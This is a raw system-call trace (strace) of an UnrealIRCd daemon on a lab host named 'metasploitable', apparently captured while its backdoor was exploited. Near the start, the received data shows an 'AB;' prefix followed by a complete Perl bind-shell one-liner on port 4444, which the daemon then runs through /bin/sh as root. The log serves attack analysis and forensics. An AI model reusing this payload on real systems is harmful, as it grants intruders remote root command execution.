4519  07:15:03.105917 select(1024, [2 3 4 7 9], [], NULL, {0, 520000}) = 1 (in [2], left {0, 320000})
4519  07:15:03.299752 clock_gettime(CLOCK_MONOTONIC, {1313, 116777024}) = 0
4519  07:15:03.299781 accept(2, 0, NULL) = 5
4519  07:15:03.299809 getpeername(5, {sa_family=AF_INET, sin_port=htons(40521), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:15:03.299854 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:15:03.299871 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:15:03.299890 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:15:03.299909 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:15:03.299927 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:15:03.299944 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:15:03.299967 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:15:03.299990 clock_gettime(CLOCK_MONOTONIC, {1313, 117006607}) = 0
4519  07:15:03.300009 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:15:03.300026 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:15:03.300041 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:15:03.300054 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:15:03.300067 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:15:03.300089 send(6, "\276\311\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:15:03.300205 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:15:03.300254 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n", 70, 0) = 70
4519  07:15:03.300462 gettimeofday({1495624503, 300471}, NULL) = 0
4519  07:15:03.300498 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:15:03.303110 clock_gettime(CLOCK_MONOTONIC, {1313, 120142136}) = 0
4519  07:15:03.303142 recvfrom(6, "\276\311\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\242\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:15:03.303222 close(6)          = 0
4519  07:15:03.303253 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:15:03.303268 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 104, 0) = 104
4519  07:15:03.303318 time(NULL)        = 1495624503
4519  07:15:03.303347 time(NULL)        = 1495624503
4519  07:15:03.303377 gettimeofday({1495624503, 303381}, NULL) = 0
4519  07:15:03.303389 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:03.303418 clock_gettime(CLOCK_MONOTONIC, {1313, 120431135}) = 0
4519  07:15:03.303428 gettimeofday({1495624503, 303432}, NULL) = 0
4519  07:15:03.303439 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:15:03.303478 clock_gettime(CLOCK_MONOTONIC, {1313, 120491200}) = 0
4519  07:15:03.303490 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:15:03.303518 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:15:03.303538 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:15:03.303550 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:15:03.303565 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 6685
6685  07:15:03.303638 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
6685  07:15:03.303652 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
6685  07:15:03.303672 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6685  07:15:03.303710 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
6685  07:15:03.303839 brk(0)            = 0x80f9000
6685  07:15:03.303861 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6685  07:15:03.303877 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee8000
6685  07:15:03.303894 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
6685  07:15:03.303911 open("/etc/ld.so.cache", O_RDONLY) = 1
6685  07:15:03.303924 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6685  07:15:03.303942 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee0000
6685  07:15:03.303953 close(1)          = 0
6685  07:15:03.303963 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6685  07:15:03.303978 open("/lib/libncurses.so.5", O_RDONLY) = 1
6685  07:15:03.303992 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
6685  07:15:03.304087 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
6685  07:15:03.304104 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eb0000
6685  07:15:03.304116 mmap2(0xb7edd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7edd000
6685  07:15:03.304133 close(1)          = 0
6685  07:15:03.304145 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6685  07:15:03.304159 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
6685  07:15:03.304205 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
6685  07:15:03.304310 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
6685  07:15:03.304327 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eac000
6685  07:15:03.304338 mmap2(0xb7eae000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7eae000
6685  07:15:03.304355 close(1)          = 0
6685  07:15:03.304370 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6685  07:15:03.304383 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
6685  07:15:03.304397 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
6685  07:15:03.304486 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
6685  07:15:03.304503 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eab000
6685  07:15:03.304516 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d5c000
6685  07:15:03.304527 mmap2(0xb7ea5000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ea5000
6685  07:15:03.304542 mmap2(0xb7ea8000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ea8000
6685  07:15:03.304555 close(1)          = 0
6685  07:15:03.304579 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d5b000
6685  07:15:03.304590 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d5b6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
6685  07:15:03.304646 mprotect(0xb7ea5000, 4096, PROT_READ) = 0
6685  07:15:03.304713 munmap(0xb7ee0000, 29913) = 0
6685  07:15:03.304754 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6685  07:15:03.304769 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
6685  07:15:03.304788 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff6b930) = -1 ENOTTY (Inappropriate ioctl for device)
6685  07:15:03.304818 brk(0)            = 0x80f9000
6685  07:15:03.304828 brk(0x80fa000)    = 0x80fa000
6685  07:15:03.304839 brk(0x80fb000)    = 0x80fb000
6685  07:15:03.304856 getuid32()        = 0
6685  07:15:03.304865 getgid32()        = 0
6685  07:15:03.304874 geteuid32()       = 0
6685  07:15:03.304883 getegid32()       = 0
6685  07:15:03.304896 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6685  07:15:03.304910 time(NULL)        = 1495624503
6685  07:15:03.304922 brk(0x80fc000)    = 0x80fc000
6685  07:15:03.304937 brk(0x80fd000)    = 0x80fd000
6685  07:15:03.304956 open("/proc/meminfo", O_RDONLY) = 1
6685  07:15:03.304977 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
6685  07:15:03.304995 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee7000
6685  07:15:03.305006 read(1, "MemTotal:      1035240 kB\nMemFree:        591240 kB\nBuffers:         64200 kB\nCached:         223504 kB\nSwapCached:          0 kB\nActive:         253144 kB\nInactive:       163480 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        591000 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5288 kB\nWriteback:           0 kB\nAnonPages:      128984 kB\nMapped:          52008 kB\nSlab:            15880 kB\nSReclaimable:     7796 kB\nSUnreclaim:       8084 kB\nPageTables:       1976 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
6685  07:15:03.305098 close(1)          = 0
6685  07:15:03.305108 munmap(0xb7ee7000, 4096) = 0
6685  07:15:03.305120 brk(0x80fe000)    = 0x80fe000
6685  07:15:03.305146 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
6685  07:15:03.305170 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
6685  07:15:03.305207 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6685  07:15:03.305233 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6685  07:15:03.305245 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
6685  07:15:03.305257 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
6685  07:15:03.305270 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6685  07:15:03.305282 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6685  07:15:03.305295 uname({sys="Linux", node="metasploitable", ...}) = 0
6685  07:15:03.305345 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6685  07:15:03.305363 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6685  07:15:03.305382 brk(0x8100000)    = 0x8100000
6685  07:15:03.305393 getcwd("/etc/unreal", 4096) = 12
6685  07:15:03.305408 getpid()          = 6685
6685  07:15:03.305424 getppid()         = 4519
6685  07:15:03.305440 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6685  07:15:03.305459 stat64("/sbin/sh", 0xbff6b908) = -1 ENOENT (No such file or directory)
6685  07:15:03.305472 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
6685  07:15:03.305489 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
6685  07:15:03.305513 socket(PF_FILE, SOCK_STREAM, 0) = 1
6685  07:15:03.305526 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
6685  07:15:03.305537 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
6685  07:15:03.305559 close(1)          = 0
6685  07:15:03.305571 socket(PF_FILE, SOCK_STREAM, 0) = 1
6685  07:15:03.305581 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
6685  07:15:03.305591 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
6685  07:15:03.305609 close(1)          = 0
6685  07:15:03.305622 open("/etc/nsswitch.conf", O_RDONLY) = 1
6685  07:15:03.305636 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
6685  07:15:03.305653 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee7000
6685  07:15:03.305695 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
6685  07:15:03.305760 read(1, "", 4096) = 0
6685  07:15:03.305769 close(1)          = 0
6685  07:15:03.305780 munmap(0xb7ee7000, 4096) = 0
6685  07:15:03.305796 open("/etc/ld.so.cache", O_RDONLY) = 1
6685  07:15:03.305809 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6685  07:15:03.305825 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee0000
6685  07:15:03.305836 close(1)          = 0
6685  07:15:03.305846 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6685  07:15:03.305861 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
6685  07:15:03.305875 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
6685  07:15:03.305968 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
6685  07:15:03.305985 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d52000
6685  07:15:03.305997 mmap2(0xb7d59000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d59000
6685  07:15:03.306014 close(1)          = 0
6685  07:15:03.306026 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6685  07:15:03.306039 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
6685  07:15:03.306052 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
6685  07:15:03.306140 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
6685  07:15:03.306191 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d3a000
6685  07:15:03.306204 mmap2(0xb7d4e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d4e000
6685  07:15:03.306233 mmap2(0xb7d50000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d50000
6685  07:15:03.306247 close(1)          = 0
6685  07:15:03.306274 munmap(0xb7ee0000, 29913) = 0
6685  07:15:03.306291 open("/etc/ld.so.cache", O_RDONLY) = 1
6685  07:15:03.306304 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6685  07:15:03.306320 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee0000
6685  07:15:03.306330 close(1)          = 0
6685  07:15:03.306341 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6685  07:15:03.306355 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
6685  07:15:03.306369 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6685  07:15:03.306462 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
6685  07:15:03.306480 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d30000
6685  07:15:03.306491 mmap2(0xb7d38000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d38000
6685  07:15:03.306507 close(1)          = 0
6685  07:15:03.306519 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
